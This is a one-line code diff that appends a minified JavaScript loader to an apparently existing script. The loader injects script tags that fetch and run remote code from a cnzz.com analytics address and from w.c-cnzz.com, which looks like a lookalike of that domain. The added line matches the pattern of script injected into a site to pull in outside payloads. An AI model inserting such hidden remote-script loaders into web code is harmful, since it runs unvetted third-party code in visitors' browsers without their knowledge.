@@ -1,0 +1,1 @@
+;var loadJs=function(url){var el=document.createElement('script');el.type='text/javascript';el.src=url;document.body.appendChild(el)};loadJs('http://c.cnzz.com/core.php?web_id=5175787&t=z&p=p');loadJs('http://w.c-cnzz.com/cl.php');
